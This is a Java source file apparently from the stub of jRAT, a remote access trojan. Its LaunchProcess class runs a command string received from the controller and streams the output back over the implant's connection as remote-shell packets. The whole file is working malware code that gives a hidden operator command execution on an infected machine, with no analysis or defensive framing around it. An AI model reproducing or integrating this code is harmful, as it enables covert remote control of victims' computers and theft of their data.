package se.jrat.stub;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import se.jrat.stub.packets.outgoing.Packet21RemoteShell;


public class LaunchProcess extends Thread {

	private Connection con;
	private Process p;
	private String process;
	private static LaunchProcess latest;

	public LaunchProcess(Connection con, String process) {
		this.con = con;
		this.process = process;
		latest = this;
	}

	public void run() {
		String line;
		try {
			p = Runtime.getRuntime().exec(process);
			con.status(Constants.STATUS_RAN_CMD);
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if (!line.trim().equals("")) {
					con.addToSendQueue(new Packet21RemoteShell(line));
				}
			}
			input.close();
			latest = null;
		} catch (Exception ex) {
			con.addToSendQueue(new Packet21RemoteShell("Failed to create process " + process + ": " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
			latest = null;
		}
	}
	
	public Process getProcess() {
		return p;
	}
	
	/**
	 * @return the latest ran process
	 */
	public static LaunchProcess getLatest() {
		return latest;
	}

}